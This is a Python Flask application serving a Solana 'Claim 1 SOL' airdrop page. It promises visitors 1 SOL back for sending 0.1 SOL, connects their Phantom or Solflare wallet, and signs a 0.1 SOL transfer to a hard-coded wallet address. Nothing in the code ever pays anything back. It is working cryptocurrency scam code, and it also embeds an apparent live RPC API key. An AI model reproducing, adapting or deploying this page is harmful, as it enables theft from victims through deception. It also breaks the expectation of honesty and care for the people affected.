from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Claim 1 SOL</title>
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
    }
    .button {
      background: linear-gradient(to right, #00ff90, #00d178);
      border: none;
      color: #000;
      font-weight: bold;
      padding: 14px 30px;
      font-size: 16px;
      border-radius: 30px;
      cursor: pointer;
      margin: 20px;
    }
    img.qr {
      width: 220px;
      margin: 20px auto;
      border-radius: 16px;
      box-shadow: 0 0 20px #00ff90;
      display: none;
    }
    #status {
      margin-top: 20px;
      color: #ccc;
      font-size: 0.9em;
      white-space: pre-wrap;
    }
    select {
      margin-top: 10px;
      padding: 10px;
      border-radius: 8px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <body>
  <h1>🎁 Claim 1 SOL – Be Fast!</h1>
  <div class="highlight-box">
    <p>🚨 <strong>Limited-Time Airdrop!</strong></p>
    <p>Send exactly <strong>0.1 SOL</strong> to the wallet below, and get back <strong>1 SOL</strong> instantly.</p>
    <p>Why? We're testing our reward bot — and first users win big! 🧠✨</p>
    <p>💡 _If you're seeing this, it's still live. Don't miss it._</p>
    <p><strong>Wallet Address:</strong><br><code>{{ wallet }}</code></p>
  </div>

  <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />

  <div>
    <button class="button" id="connectBtn">🔗 Connect Wallet</button>
    <select id="networkSelect">
      <option value="mainnet-beta">Mainnet</option>
      <option value="devnet">Devnet</option>
    </select>
    <button class="button" id="claimBtn" disabled>💸 Claim Now</button>
  </div>

  <div id="status">Click "Connect Wallet" to begin.</div>

  <script>
    const status = document.getElementById("status");
    const qr = document.getElementById("qrCode");
    const connectBtn = document.getElementById("connectBtn");
    const claimBtn = document.getElementById("claimBtn");
    const networkSelect = document.getElementById("networkSelect");

    let provider = null;
    let publicKey = null;

    connectBtn.addEventListener('click', async () => {
      if (window.solana?.isPhantom) {
        provider = window.solana;
      } else if (window.solflare?.isSolflare) {
        provider = window.solflare;
      } else {
        status.innerText = "⚠️ No wallet detected. Open this in Phantom or Solflare.";
        qr.style.display = "block";
        return;
      }

      try {
        status.innerText = "🔄 Waiting for wallet approval...";
        const response = await provider.connect();
        publicKey = response.publicKey || provider.publicKey;
        status.innerText = "✅ Connected: " + publicKey.toString();
        claimBtn.disabled = false;
      } catch (err) {
        console.error("Connection failed:", err);
        status.innerText = "❌ Wallet connection failed.";
      }
    });

    claimBtn.addEventListener('click', async () => {
      if (!provider || !publicKey) {
        status.innerText = "❌ Wallet not connected.";
        return;
      }

      const network = networkSelect.value;

      // Use CORS-compatible RPC endpoints
      const customRPC = {
        "mainnet-beta": "https://mainnet.helius-rpc.com/?api-key=9867d904-fdcc-46b7-b5b1-c9ae880bd41d",
        "devnet": "https://api.devnet.solana.com"
      };

      const connection = new solanaWeb3.Connection(customRPC[network], "confirmed");

      const recipientPubkey = new solanaWeb3.PublicKey("{{ wallet }}");

      try {
        const transaction = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: recipientPubkey,
            lamports: 0.1 * solanaWeb3.LAMPORTS_PER_SOL,
          })
        );

        transaction.feePayer = publicKey;
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;

        let signed = await provider.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signed.serialize());
        await connection.confirmTransaction(signature);

        status.innerText = "✅ Transaction successful!\\nSignature: " + signature;
      } catch (err) {
        console.error("Transaction failed:", err);
        status.innerText = "❌ Transaction failed: " + err.message;
      }
    });
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
